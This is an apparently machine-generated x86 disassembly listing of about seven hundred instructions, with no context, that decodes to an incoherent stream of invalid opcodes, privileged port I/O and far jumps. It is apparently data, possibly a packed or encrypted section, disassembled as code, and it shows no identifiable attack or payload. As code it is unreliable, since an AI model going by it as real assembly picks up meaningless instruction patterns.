  415d05:	mov    bh,0x6a
  415d07:	aaa    
  415d08:	enter  0x2e2d,0x58
  415d0c:	outs   dx,BYTE PTR ds:[esi]
  415d0d:	cmp    dl,BYTE PTR [eax]
  415d0f:	push   edi
  415d10:	mov    edi,0x2736a935
  415d15:	or     esp,DWORD PTR [edi]
  415d17:	out    0x50,eax
  415d19:	cwde   
  415d1a:	push   ebp
  415d1b:	xchg   edx,eax
  415d1c:	cwde   
  415d1d:	divps  xmm4,XMMWORD PTR ds:0xd2245567
  415d24:	gs out dx,eax
  415d26:	mov    al,0xda
  415d28:	imul   ebx,DWORD PTR ss:[ebx-0x277f6ec6],0x586a36f5
  415d33:	loopne 0x415cc8
  415d35:	hlt    
  415d36:	mov    dl,BYTE PTR [edx+0x24]
  415d39:	aaa    
  415d3a:	ins    DWORD PTR es:[edi],dx
  415d3b:	mov    ah,ch
  415d3d:	push   es
  415d3e:	mov    edx,0x9ccd94f
  415d43:	fcom   DWORD PTR [esp+eax*8+0x69694c28]
  415d4a:	xor    eax,0x912bda64
  415d4f:	cwde   
  415d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d51:	jp     0x415d5e
  415d53:	add    BYTE PTR [edx-0x3473d15a],cl
  415d59:	mov    BYTE PTR [edx],ch
  415d5b:	bound  edi,QWORD PTR [ecx]
  415d5d:	inc    edx
  415d5e:	mov    eax,0x963f5fbe
  415d63:	stc    
  415d64:	fcom   QWORD PTR [ebp+0x45]
  415d67:	and    BYTE PTR [ecx-0x2a97094a],cl
  415d6d:	jbe    0x415d4a
  415d6f:	lahf   
  415d70:	xor    BYTE PTR [ecx-0x6f],bh
  415d73:	dec    ebp
  415d74:	clc    
  415d75:	rcl    DWORD PTR [esi-0x8a47b2e],cl
  415d7b:	aam    0x8d
  415d7d:	or     DWORD PTR [edx+0x6ec3a5ad],esp
  415d83:	or     eax,0xcfcc8f12
  415d88:	mov    ebp,0xba3bcc07
  415d8d:	outs   dx,DWORD PTR ds:[esi]
  415d8e:	mov    cl,0x75
  415d90:	jbe    0x415d81
  415d92:	and    BYTE PTR [esi],0x3
  415d95:	push   es
  415d96:	int3   
  415d97:	xchg   edx,eax
  415d98:	adc    ecx,DWORD PTR [eax+0x18b1224a]
  415d9e:	jp     0x415dc7
  415da0:	xor    DWORD PTR [ebp-0x3],ebp
  415da3:	jecxz  0x415d97
  415da5:	pushf  
  415da6:	xor    DWORD PTR [edx],ecx
  415da8:	inc    esp
  415da9:	div    dh
  415dab:	xlat   BYTE PTR ds:[ebx]
  415dac:	iret   
  415dad:	xlat   BYTE PTR ds:[ebx]
  415dae:	jle    0x415d51
  415db0:	enter  0x1dd8,0x4f
  415db4:	out    dx,al
  415db5:	dec    edx
  415db6:	push   edx
  415db7:	addr16 dec esi
  415db9:	pop    edx
  415dba:	sahf   
  415dbb:	or     DWORD PTR [esi+0x10933d97],eax
  415dc1:	or     ecx,DWORD PTR [edx-0x49]
  415dc4:	ret    
  415dc5:	sbb    eax,0x7a354021
  415dca:	loopne 0x415d68
  415dcc:	and    esi,DWORD PTR [esi]
  415dce:	xchg   ecx,eax
  415dcf:	pop    edx
  415dd0:	int3   
  415dd1:	das    
  415dd2:	mov    esi,DWORD PTR [ecx-0x6e74e30]
  415dd8:	loopne 0x415dd0
  415dda:	adc    al,ch
  415ddc:	xchg   esp,eax
  415ddd:	pushf  
  415dde:	sub    eax,0xf76995a6
  415de3:	push   cs
  415de4:	xchg   ebp,esp
  415de6:	xor    al,bl
  415de8:	js     0xd5184705
  415dee:	add    ax,0x870d
  415df2:	arpl   dx,ax
  415df4:	cmp    esp,eax
  415df6:	adc    edi,DWORD PTR [ebx]
  415df8:	dec    ebp
  415df9:	mov    ch,0xa6
  415dfb:	rcl    DWORD PTR [edi+ecx*2],1
  415dfe:	jmp    0x415e78
  415e00:	or     al,0x36
  415e02:	leave  
  415e03:	fisubr DWORD PTR [eax+0x16fcee31]
  415e09:	cmp    DWORD PTR [edi+0x1a],ebx
  415e0c:	arpl   di,cx
  415e0e:	mov    esp,0x1c22bfb8
  415e13:	xor    DWORD PTR [ebp+0x3e],0xd4a24edd
  415e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e1b:	cmp    esp,edi
  415e1d:	jmp    0x5549:0xeb57c758
  415e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e25:	pop    edi
  415e26:	push   eax
  415e27:	xlat   BYTE PTR ds:[ebx]
  415e28:	stc    
  415e29:	pushf  
  415e2a:	sub    eax,0x1ee80eb9
  415e2f:	cmp    DWORD PTR [ebx+eiz*2+0xb4efc80],edi
  415e36:	out    dx,eax
  415e37:	fist   WORD PTR [ecx-0x2649645c]
  415e3d:	jno    0x415e0c
  415e3f:	xchg   ecx,eax
  415e40:	inc    esi
  415e41:	faddp  st(1),st
  415e43:	pop    ecx
  415e44:	mov    bl,0x3a
  415e46:	cli    
  415e47:	(bad)  
  415e48:	cmc    
  415e49:	fistp  WORD PTR [ebx+0x40c9f286]
  415e4f:	push   esp
  415e50:	mov    eax,ds:0x6e153ec3
  415e55:	std    
  415e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e57:	test   DWORD PTR [edi+esi*2-0x6d],ebp
  415e5b:	xchg   dh,dl
  415e5d:	inc    ecx
  415e5e:	mov    dh,0x23
  415e60:	(bad)  
  415e61:	mov    BYTE PTR [ebp-0x233025e1],al
  415e67:	pop    ds
  415e68:	or     edx,DWORD PTR [esi-0x3c]
  415e6b:	leave  
  415e6c:	icebp  
  415e6d:	shl    BYTE PTR [ecx+eiz*8+0x2300fb3f],cl
  415e74:	cmc    
  415e75:	aaa    
  415e76:	push   ebx
  415e77:	mov    dh,0x85
  415e79:	sahf   
  415e7a:	pop    ebp
  415e7b:	je     0x415e51
  415e7d:	dec    ecx
  415e7e:	mov    al,ds:0xee7a8aef
  415e83:	add    al,0x45
  415e85:	jl     0x415e2c
  415e87:	sbb    ecx,DWORD PTR [esi+edx*2+0x5cba8e2a]
  415e8e:	mov    cl,0xfa
  415e90:	out    0x89,eax
  415e92:	add    edi,esi
  415e94:	inc    esp
  415e95:	adc    DWORD PTR [edi-0x156f6689],ebp
  415e9b:	or     al,0xc8
  415e9d:	mov    edx,0x6e1014b2
  415ea2:	or     DWORD PTR [edx],ebx
  415ea4:	push   esi
  415ea5:	dec    eax
  415ea6:	jns    0x415f13
  415ea8:	inc    eax
  415ea9:	int    0xa9
  415eab:	sahf   
  415eac:	popf   
  415ead:	mov    eax,0x7f47cb9c
  415eb2:	sti    
  415eb3:	cmc    
  415eb4:	imul   ah
  415eb6:	mov    bh,0x6f
  415eb8:	xor    eax,0x5dc59871
  415ebd:	mov    WORD PTR [edi],?
  415ebf:	mov    DWORD PTR [esi+0x7d9586c8],eax
  415ec5:	jmp    0xa2c2ed0e
  415eca:	dec    si
  415ecc:	add    BYTE PTR [eax],ah
  415ece:	inc    edi
  415ecf:	mov    ebp,0x6ca15cce
  415ed4:	sbb    BYTE PTR [edx-0x37],0x2d
  415ed8:	or     DWORD PTR [bp-0x2b0b],0x51
  415ede:	and    BYTE PTR [esi],cl
  415ee0:	xor    bh,BYTE PTR [ebx]
  415ee2:	aaa    
  415ee3:	inc    edi
  415ee4:	jmp    0x3efe:0x68094fb3
  415eeb:	inc    eax
  415eec:	inc    esi
  415eed:	lods   al,BYTE PTR ds:[esi]
  415eee:	(bad)  
  415eef:	hlt    
  415ef0:	cmp    al,0xe8
  415ef2:	and    esp,DWORD PTR [eax+0x379833e8]
  415ef8:	sub    al,0x95
  415efa:	jns    0x415f18
  415efc:	xchg   edi,eax
  415efd:	adc    al,0x53
  415eff:	stos   DWORD PTR es:[edi],eax
  415f00:	in     eax,0x4f
  415f02:	or     BYTE PTR [edi+ecx*4+0x74],bh
  415f06:	mov    edx,0x26c78d17
  415f0b:	retf   0xacf0
  415f0e:	in     al,dx
  415f0f:	jge    0x415f1e
  415f11:	loope  0x415f60
  415f13:	push   0xc4069f3c
  415f18:	mov    bh,0xbe
  415f1a:	call   0x614f8fbf
  415f1f:	pop    eax
  415f20:	(bad)  
  415f22:	pop    edi
  415f23:	jl     0x415f26
  415f25:	outs   dx,BYTE PTR ds:[esi]
  415f26:	arpl   WORD PTR [edx],di
  415f28:	jo     0x415f77
  415f2a:	nop
  415f2b:	(bad)  
  415f2c:	js     0x415ec5
  415f2e:	pop    es
  415f2f:	rcr    BYTE PTR [esp+esi*8+0x1b],1
  415f33:	or     bl,BYTE PTR [ebp-0x358eb8c0]
  415f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3a:	jne    0x415f9c
  415f3c:	lahf   
  415f3d:	jl     0x415f71
  415f3f:	cmp    ch,ch
  415f41:	dec    ebx
  415f42:	xchg   esp,eax
  415f43:	ins    BYTE PTR es:[edi],dx
  415f44:	iret   
  415f45:	xor    ebx,DWORD PTR [edx]
  415f47:	and    ch,dl
  415f49:	dec    edi
  415f4a:	xor    eax,0x19243183
  415f4f:	or     DWORD PTR [ebx],ebp
  415f51:	jb     0x415ed9
  415f53:	jae    0x415f95
  415f55:	xchg   ebp,eax
  415f56:	push   esi
  415f57:	add    DWORD PTR [ecx],ebx
  415f59:	ret    
  415f5a:	sub    ebx,DWORD PTR [edx+0x11957ba8]
  415f60:	arpl   WORD PTR [edx-0x5],dx
  415f63:	call   0x3156:0xc788463
  415f6a:	mov    al,ds:0x92fbbeb8
  415f70:	and    ebx,DWORD PTR [ebp-0x8dad745]
  415f76:	pop    es
  415f77:	xor    ch,BYTE PTR [eax]
  415f79:	dec    ebp
  415f7a:	xor    al,0xa6
  415f7c:	or     ecx,DWORD PTR [edi-0x501aa041]
  415f82:	stos   BYTE PTR es:[edi],al
  415f83:	push   ebp
  415f84:	xlat   BYTE PTR ds:[ebx]
  415f85:	(bad)  
  415f86:	call   0xe1d621f8
  415f8b:	cmp    BYTE PTR [eax],al
  415f8d:	data16 cli 
  415f8f:	jnp    0x415f9f
  415f91:	es retf 
  415f93:	shl    ch,cl
  415f95:	inc    BYTE PTR [esi]
  415f97:	aaa    
  415f98:	mov    edx,0xd6407bb4
  415f9d:	int3   
  415f9e:	and    ebp,esp
  415fa0:	add    bl,BYTE PTR [edx+0x6e89b7a3]
  415fa6:	push   cs
  415fa7:	sbb    DWORD PTR [edi],esi
  415fa9:	ss pop ds
  415fab:	fwait
  415fac:	jp     0x415fd5
  415fae:	mov    ecx,0x7c4187f8
  415fb3:	sbb    dl,BYTE PTR [ebx]
  415fb5:	js     0x415f39
  415fb7:	adc    al,0xa0
  415fb9:	ficom  DWORD PTR [ecx-0x1a38c976]
  415fbf:	fs sub al,0x19
  415fc2:	repz xor ebx,ebp
  415fc5:	test   BYTE PTR [ecx-0x17c9135c],bl
  415fcb:	stos   DWORD PTR es:[edi],eax
  415fcc:	enter  0x1b01,0x20
  415fd0:	in     al,dx
  415fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd2:	adc    DWORD PTR [ebx+ecx*1-0x3b],ecx
  415fd6:	ins    DWORD PTR es:[edi],dx
  415fd7:	jle    0x415fca
  415fd9:	leave  
  415fda:	pop    edi
  415fdb:	jp     0x415fa0
  415fdd:	jg     0x415fce
  415fdf:	pop    ss
  415fe0:	loopne 0x415fd5
  415fe2:	adc    eax,0x3d427d35
  415fe7:	pop    ss
  415fe8:	mov    ebp,0x931b4410
  415fed:	jb     0x416064
  415fef:	push   0xffffffee
  415ff1:	sbb    dl,BYTE PTR [edx-0x7a]
  415ff4:	js     0x415fa8
  415ff6:	mov    eax,0x64d92915
  415ffb:	frstor [ecx-0x3f]
  415ffe:	jo     0x415fbf
  416000:	cmp    ebx,DWORD PTR [edi-0x78]
  416003:	mov    ds:0x59772122,eax
  416008:	pop    edi
  416009:	repz ret 
  41600b:	ficomp WORD PTR [esi-0x56832f3a]
  416011:	out    dx,eax
  416012:	mov    esi,0x552d4a77
  416017:	add    eax,0x4a0917c6
  41601c:	retf   
  41601d:	stos   DWORD PTR es:[edi],eax
  41601e:	mov    ecx,0x138c3f24
  416023:	inc    BYTE PTR [ebp-0x5e]
  416026:	(bad)  
  416027:	jl     0x415fd0
  416029:	dec    eax
  41602a:	jl     0x416043
  41602c:	jg     0x416023
  41602e:	sub    esp,DWORD PTR [bp-0x15]
  416032:	inc    esi
  416033:	and    DWORD PTR [edi-0x4e80c873],esi
  416039:	mov    ah,0x7
  41603b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41603c:	mov    cl,0x49
  41603e:	into   
  41603f:	(bad)  
  416040:	xlat   BYTE PTR ds:[ebx]
  416041:	dec    ebp
  416042:	int    0x85
  416044:	nop
  416045:	test   al,0xd9
  416047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416048:	sub    DWORD PTR [eax-0x44],ebp
  41604b:	in     al,0xb2
  41604d:	loopne 0x416052
  41604f:	pop    ss
  416050:	xchg   ecx,eax
  416051:	sbb    eax,0x4214660f
  416056:	mov    edx,0xd29ce6df
  41605b:	or     ebx,0x55fb60f1
  416061:	sbb    edi,DWORD PTR [edi+0x37]
  416064:	dec    edi
  416065:	push   es
  416066:	aaa    
  416067:	scas   eax,DWORD PTR es:[edi]
  416068:	and    dh,bh
  41606a:	aaa    
  41606b:	mov    esi,0x39920fd8
  416070:	add    eax,0xe7c8d6ea
  416075:	cmp    al,BYTE PTR [ecx+0x14]
  416078:	pop    edi
  416079:	aaa    
  41607a:	cwde   
  41607b:	cmp    BYTE PTR [edx+0x76],bl
  41607e:	out    0xe5,al
  416080:	sbb    DWORD PTR [edi-0x15296059],ebp
  416086:	inc    ecx
  416087:	dec    esp
  416088:	dec    edx
  416089:	retf   
  41608a:	fwait
  41608b:	pop    esp
  41608c:	jge    0x41606b
  41608e:	outs   dx,DWORD PTR ds:[esi]
  41608f:	or     edx,edi
  416091:	jecxz  0x416103
  416093:	(bad)  
  416094:	cdq    
  416095:	cli    
  416096:	mov    al,ds:0x15119295
  41609b:	dec    eax
  41609c:	push   esi
  41609d:	jmp    0xe466:0x301fdc3
  4160a4:	ret    
  4160a5:	mov    dh,0xd4
  4160a7:	xor    DWORD PTR [edi+eiz*4],esi
  4160aa:	hlt    
  4160ab:	mov    dh,0x43
  4160ad:	les    esp,FWORD PTR [eax]
  4160af:	sar    edx,0x6e
  4160b2:	cmp    bl,bl
  4160b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b5:	push   esi
  4160b6:	mov    dh,0xe5
  4160b8:	and    esi,DWORD PTR [edi]
  4160ba:	mov    ebp,0x4bcc6e7
  4160bf:	dec    ecx
  4160c0:	push   es
  4160c1:	out    dx,eax
  4160c2:	sub    edi,edi
  4160c4:	push   ebp
  4160c5:	pop    ds
  4160c6:	test   BYTE PTR [eax+0x39],0xf2
  4160ca:	sbb    cl,BYTE PTR [ecx+0x58]
  4160cd:	adc    BYTE PTR [eax],bh
  4160cf:	call   0x584c6574
  4160d4:	mov    esp,DWORD PTR [ebp-0x6]
  4160d7:	mov    ecx,0x79bd9e4a
  4160dc:	and    ah,BYTE PTR [ebx-0x76]
  4160df:	adc    ch,BYTE PTR ds:0x461c0328
  4160e5:	mov    edi,0x2775d9c
  4160ea:	aad    0xd4
  4160ec:	dec    ebp
  4160ed:	jp     0x4160b4
  4160ef:	cmp    edx,DWORD PTR ds:0x6943b9a5
  4160f5:	(bad)  
  4160f6:	inc    edx
  4160f7:	inc    ecx
  4160f8:	(bad)  
  4160fa:	mov    WORD PTR [ebx+0x7],?
  4160fd:	mov    ah,0x37
  4160ff:	frstor [edx+0x4c]
  416102:	ss out dx,eax
  416104:	dec    edi
  416105:	loop   0x4160cc
  416107:	aaa    
  416108:	jns    0x41611a
  41610a:	cmp    bl,BYTE PTR [edx+0x7c5dac87]
  416110:	and    dl,ch
  416112:	dec    esi
  416113:	into   
  416114:	out    dx,al
  416115:	int3   
  416116:	fadd   DWORD PTR [edx]
  416118:	inc    edi
  416119:	lds    esp,FWORD PTR [ebx-0x4f40f181]
  41611f:	pop    ecx
  416120:	cmp    ebx,edx
  416122:	sbb    dl,BYTE PTR [ebx-0x78f82bcf]
  416128:	or     bl,dl
  41612a:	adc    eax,0x61d65d1a
  41612f:	jo     0x4160dd
  416131:	sub    al,0xd0
  416133:	push   cs
  416134:	jb     0x416122
  416136:	idiv   edi
  416138:	and    al,0x35
  41613a:	mov    ecx,0xa6fdaa00
  41613f:	xchg   ecx,eax
  416140:	test   al,0x3b
  416142:	loope  0x416134
  416144:	retf   0x1685
  416147:	xchg   esi,eax
  416148:	out    0x4e,eax
  41614a:	push   ebp
  41614b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41614c:	ja     0x4160e8
  41614e:	lock test eax,0xc6513d8e
  416154:	cmp    dl,BYTE PTR [ebx-0x1b0a0035]
  41615a:	and    eax,DWORD PTR cs:[edx+ecx*4]
  41615e:	repz dec ecx
  416160:	dec    eax
  416161:	sbb    al,0xf2
  416163:	inc    edx
  416164:	stos   DWORD PTR es:[edi],eax
  416165:	pusha  
  416166:	bound  edi,QWORD PTR [edx+0x173ad300]
  41616c:	ret    0xff2f
  41616f:	push   cs
  416170:	lods   al,BYTE PTR ds:[esi]
  416171:	retf   
  416172:	(bad)  
  416173:	fucomip st,st(7)
  416175:	and    BYTE PTR [ebx+0x4cb11293],bh
  41617b:	idiv   DWORD PTR [eax-0x31]
  41617e:	lods   eax,DWORD PTR ds:[esi]
  41617f:	hlt    
  416180:	rol    DWORD PTR [esp+eax*8+0x606d3fbd],1
  416187:	or     bl,BYTE PTR [ebx+0x56d7200b]
  41618d:	fsubr  DWORD PTR [edi+ebp*8+0x52cabcad]
  416194:	jge    0x416193
  416196:	pop    ecx
  416197:	lea    ebx,[edi]
  416199:	nop
  41619a:	xor    eax,0x1feb3e6f
  41619f:	inc    ebx
  4161a0:	jmp    0xe214:0xb8ba4819
  4161a7:	inc    edi
  4161a8:	add    cl,BYTE PTR [bx+si+0x68]
  4161ac:	mov    DWORD PTR [ecx+0xb],edi
  4161af:	imul   eax,DWORD PTR [esi-0x10],0xffffff80
  4161b3:	sbb    BYTE PTR [di-0x47c3],dl
  4161b8:	xor    eax,0x5934b9ed
  4161bd:	fwait
  4161be:	or     esi,DWORD PTR [esi]
  4161c0:	mov    esp,fs
  4161c2:	scas   eax,DWORD PTR es:[edi]
  4161c3:	pop    ds
  4161c4:	inc    ebp
  4161c5:	add    BYTE PTR [edi-0x20],ch
  4161c8:	iret   
  4161c9:	enter  0x7859,0xb8
  4161cd:	adc    eax,0x88d8ea74
  4161d2:	retf   
  4161d3:	in     eax,0x0
  4161d5:	and    esi,DWORD PTR [esi+ebp*2]
  4161d8:	ins    DWORD PTR es:[edi],dx
  4161d9:	lods   al,BYTE PTR ds:[esi]
  4161da:	nop
  4161db:	sbb    al,0xdf
  4161dd:	mov    ah,0xe2
  4161df:	xor    eax,DWORD PTR [ebx]
  4161e1:	(bad)  [esi]
  4161e3:	xchg   ebx,eax
  4161e4:	jl     0x416204
  4161e6:	loope  0x4161b0
  4161e8:	dec    cl
  4161ea:	inc    ecx
  4161eb:	sbb    ah,BYTE PTR [esi]
  4161ed:	fwait
  4161ee:	push   0x2d6dda5e
  4161f3:	push   0x76
  4161f5:	push   ebp
  4161f6:	mov    ds,WORD PTR [ebp-0x5f]
  4161f9:	cmp    BYTE PTR ds:0xa0ffafbd,cl
  4161ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416200:	and    al,0x94
  416202:	lods   eax,DWORD PTR ds:[esi]
  416203:	shl    BYTE PTR [ecx-0x20],1
  416206:	pop    edi
  416207:	pop    esp
  416208:	mov    dh,ah
  41620a:	dec    ebx
  41620b:	push   0x944ffcdf
  416210:	pop    ebx
  416211:	pusha  
  416212:	scas   eax,DWORD PTR es:[edi]
  416213:	adc    BYTE PTR [edx+0x7b],al
  416216:	adc    bl,BYTE PTR [edi-0x20]
  416219:	vpunpckhqdq ymm3,ymm7,YMMWORD PTR [esp+ebx*1]
  41621e:	adc    edx,esi
  416220:	popa   
  416221:	sbb    DWORD PTR [eax],edi
  416223:	mov    esi,0x70a96683
  416228:	mov    ebp,0xd383665d
  41622d:	mov    ds:0x8a968668,eax
  416232:	cmp    BYTE PTR [edi-0x52b11628],bl
  416238:	gs jo  0x4161c4
  41623b:	xchg   ecx,eax
  41623c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41623d:	pop    es
  41623e:	and    DWORD PTR [eax],edx
  416240:	je     0x416294
  416242:	sahf   
  416243:	rcl    ch,cl
  416245:	cmc    
  416246:	inc    eax
  416247:	push   ebx
  416248:	sbb    eax,0x2b51ed96
  41624d:	in     al,dx
  41624e:	cmp    al,0xf5
  416250:	add    edi,ebp
  416252:	das    
  416253:	cld    
  416254:	ret    
  416255:	repz stc 
  416257:	or     BYTE PTR [edx],ch
  416259:	inc    esi
  41625a:	jo     0x4161e3
  41625c:	repnz mov ds:0x932a0ef0,eax
  416262:	mov    ebp,0x96ebc9d6
  416267:	rcr    DWORD PTR [ebp+0x65bd4e63],1
  41626d:	in     al,0x3e
  41626f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416270:	jo     0x416282
  416272:	adc    eax,0xfb7f02e6
  416277:	xchg   DWORD PTR ds:0xdd890556,ebp
  41627d:	adc    ecx,DWORD PTR [eax-0x1fbf4ce8]
  416283:	int    0x52
  416285:	dec    ebp
  416286:	jno    0x416260
  416288:	scas   eax,DWORD PTR es:[edi]
  416289:	dec    eax
  41628a:	mov    gs:0x647efa72,eax
  416290:	test   eax,0x545fa508
  416295:	mov    al,0x7c
  416297:	sbb    DWORD PTR [edx+0x607abe3f],ebx
  41629d:	push   eax
  41629e:	mov    dh,0x69
  4162a0:	dec    eax
  4162a1:	or     esi,ebp
  4162a3:	test   DWORD PTR [ebx+0x79],ebx
  4162a6:	mov    ecx,0xdd7354c9
  4162ab:	and    al,0x70
  4162ad:	push   ecx
  4162ae:	enter  0x6ebb,0x84
  4162b2:	mov    ecx,0xaffc6d09
  4162b7:	pop    ecx
  4162b8:	adc    eax,0x432a5fcb
  4162bd:	and    eax,0xe02315ce
  4162c2:	xchg   edx,eax
  4162c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162c4:	mov    edi,0x14a18d39
  4162c9:	hlt    
  4162ca:	pop    esi
  4162cb:	adc    eax,0xe8208318
  4162d0:	xor    edx,DWORD PTR [eax]
  4162d2:	mov    ch,0xc1
  4162d4:	pop    edi
  4162d5:	enter  0xb712,0x8
  4162d9:	and    ecx,DWORD PTR [esi+ecx*4-0x3e0c63f0]
  4162e0:	lahf   
  4162e1:	out    0x5f,eax
  4162e3:	sbb    dl,BYTE PTR [ebp+0x41e82fcb]
  4162e9:	or     BYTE PTR [esi],al
  4162eb:	push   0xd1274536
  4162f0:	outs   dx,DWORD PTR ds:[esi]
  4162f1:	retf   0xc279
  4162f4:	pusha  
  4162f5:	and    DWORD PTR [eax+0x5b3e4776],ebx
  4162fb:	mov    ecx,0x4c191e3e
  416300:	aas    
  416301:	inc    ebp
  416302:	sub    dl,BYTE PTR [ebp+0x451058ae]
  416308:	jno    0x416343
  41630a:	add    ebp,DWORD PTR [edx]
  41630c:	hlt    
  41630d:	cmp    al,0x3c
  41630f:	dec    edx
  416310:	mov    bl,0xdf
  416312:	jle    0x416307
  416314:	scas   eax,DWORD PTR es:[edi]
  416315:	mov    dh,cl
  416317:	add    al,0xdb
  416319:	pop    eax
  41631a:	arpl   sp,dx
  41631c:	inc    esi
  41631d:	push   edi
  41631e:	addr16 fcmovb st,st(4)
  416321:	(bad)  
  416323:	push   edx
  416324:	pop    es
  416325:	fsubr  DWORD PTR [ebx+0x678d345]
  41632b:	mov    dl,BYTE PTR [ebx]
  41632d:	fstp   QWORD PTR [ebp-0x71d77a4e]
  416333:	shl    DWORD PTR [eax-0x1691df61],1
  416339:	jp     0x4163a9
  41633b:	out    dx,eax
  41633c:	xchg   ecx,eax
  41633d:	push   ds
  41633e:	dec    edx
  41633f:	and    BYTE PTR [ebx],ah
  416341:	(bad)  
  416342:	fisttp DWORD PTR [esi]
  416344:	pop    eax
  416345:	xchg   ebx,eax
  416346:	xchg   ecx,eax
  416347:	pop    ds
  416348:	sbb    ebx,DWORD PTR [ebx]
  41634a:	int3   
  41634b:	push   es
  41634c:	fcmovnu st,st(2)
  41634e:	addr16 dec eax
  416350:	xchg   edx,eax
  416351:	cli    
  416352:	pushf  
  416353:	mov    dl,0x78
  416355:	push   ds
  416356:	adc    BYTE PTR [edi+eiz*1+0x7754ffaa],0x3d
  41635e:	push   ecx
  41635f:	mov    esi,0xb0df3fdf
  416364:	imul   ebx,DWORD PTR [ebp+0x381cbf49],0x24
  41636b:	lock add WORD PTR [eax-0x7],0x5c82
  416372:	add    ebp,ebp
  416374:	jb     0x41637f
  416376:	jecxz  0x41639c
  416378:	aad    0xf0
  41637a:	je     0x4163a8
  41637c:	inc    eax
  41637d:	out    0x2,al
  41637f:	sbb    ecx,DWORD PTR [ecx+0x439e850a]
  416385:	shl    DWORD PTR ds:0x3bc8c22d,1
  41638b:	mov    ebp,0xd746df07
  416390:	imul   bl
  416392:	mov    ecx,0xd4d45c76
  416397:	mov    esp,0xdb7d5d9d
  41639c:	add    al,0x2
  41639e:	lods   eax,DWORD PTR ds:[esi]
  41639f:	jg     0x4163ca
  4163a1:	xchg   esi,eax
  4163a2:	mov    al,0xa0
  4163a4:	scas   al,BYTE PTR es:[edi]
  4163a5:	fadd   st,st(7)
  4163a7:	cmp    DWORD PTR [esi],esp
  4163a9:	ret    0x7806
  4163ac:	xchg   esp,eax
  4163ad:	or     al,0x93
  4163af:	rol    BYTE PTR [esi-0x24a1cb25],1
  4163b5:	je     0x416398
  4163b7:	add    esi,DWORD PTR [eax+0x10]
  4163ba:	shl    BYTE PTR ds:0xd654e3e3,cl
  4163c0:	ja     0x416391
  4163c2:	and    esp,edi
  4163c4:	mov    ecx,0x91406ee6
  4163c9:	outs   dx,DWORD PTR ds:[esi]
  4163ca:	out    0x23,al
  4163cc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4163ce:	(bad)  
  4163cf:	dec    esp
  4163d0:	ret    
  4163d1:	mov    edi,0x1a6e7e72
  4163d6:	out    0xfb,al
  4163d8:	jo     0x416391
  4163da:	dec    edi
  4163db:	push   ds
  4163dc:	loop   0x41641e
  4163de:	add    al,0x8b
  4163e0:	adc    eax,0x80ec4626
  4163e5:	cld    
  4163e6:	in     eax,0x14
  4163e8:	out    0x57,al
  4163ea:	dec    esi
  4163eb:	pop    eax
  4163ec:	sub    al,0xfa
  4163ee:	(bad)  
  4163ef:	in     al,0xc6
  4163f1:	bound  edi,QWORD PTR [ecx]
  4163f3:	cwde   
  4163f4:	ss loop 0x41642a
  4163f7:	pop    ds
  4163f8:	mov    ds:0x20fa1262,eax
  4163fd:	rol    edx,1
  4163ff:	icebp  
  416400:	sub    eax,0x5d9a8f5
  416405:	cmp    BYTE PTR [edx],0x68
  416408:	pop    edi
  416409:	cdq    
  41640a:	repz fwait
  41640c:	jae    0x4163bc
  41640e:	ins    BYTE PTR es:[edi],dx
  41640f:	pop    edi
  416410:	addr16 mov bl,0x8
  416413:	xor    al,0xa6
  416415:	mov    ds:0xf285a798,eax
  41641a:	add    ah,BYTE PTR [ebp+0x57]
  41641d:	loope  0x416438
  41641f:	dec    ecx
  416420:	aam    0xed
  416422:	in     al,dx
  416423:	xor    bh,al
  416425:	mov    ah,0x84
  416427:	mov    BYTE PTR [edi],bl
  416429:	(bad)  
  41642a:	fdivr  st,st(3)
  41642c:	xchg   edi,eax
  41642d:	add    eax,0x50889bea
  416432:	popa   
  416433:	adc    eax,0xafcbb504
  416438:	push   ss
  416439:	cmp    esp,ebx
  41643b:	out    dx,al
  41643c:	lahf   
  41643d:	mov    esp,DWORD PTR [eax+esi*4]
  416440:	fild   QWORD PTR [ebx]
  416442:	mov    ch,0xfb
  416444:	ss addr16 test al,0xed
  416448:	retf   0xeea1
  41644b:	aam    0x98
  41644d:	mov    dh,0x1b
  41644f:	adc    BYTE PTR [ebx+0x11078f3b],0x64
  416456:	mov    esp,0xa3b2f9cf
  41645b:	inc    eax
  41645c:	imul   edx,DWORD PTR [esi-0x6f],0xf43a5aa1
  416463:	(bad)  
  416464:	pop    ds
  416465:	scas   al,BYTE PTR es:[edi]
  416466:	and    eax,0xa97eb40b
  41646b:	sub    al,0x4d
  41646d:	inc    edx
  41646e:	retf   
  41646f:	inc    esp
  416470:	loopne 0x41646d
  416472:	sub    BYTE PTR [ebx+0x9],dh
  416475:	sub    dh,BYTE PTR [esi]
  416477:	es cmc 
  416479:	outs   dx,BYTE PTR ds:[esi]
  41647a:	add    DWORD PTR cs:[eax+ebp*4-0x2cfde30b],esp
  416482:	mov    ebx,0xf0eb9121
  416487:	lock jp 0x41648d
  41648a:	lahf   
  41648b:	xchg   ebp,eax
  41648c:	inc    DWORD PTR [ebp-0x771ee767]
  416492:	or     cl,BYTE PTR [eax+0x2505998b]
  416498:	pop    edi
  416499:	mov    esi,ecx
  41649b:	xchg   esi,eax
  41649c:	gs mov dl,0x5c
  41649f:	xchg   eax,ebx
  4164a1:	aam    0xc5
  4164a3:	adc    DWORD PTR [ebx+0x643a3954],0x77
  4164aa:	test   DWORD PTR [ecx],ebx
  4164ac:	pop    edx
  4164ad:	xlat   BYTE PTR ds:[ebx]
  4164ae:	sub    ebp,DWORD PTR [edi+ecx*1-0x86648f6]
  4164b5:	fsub   st(4),st
  4164b7:	jmp    0xa594:0xf49badc9
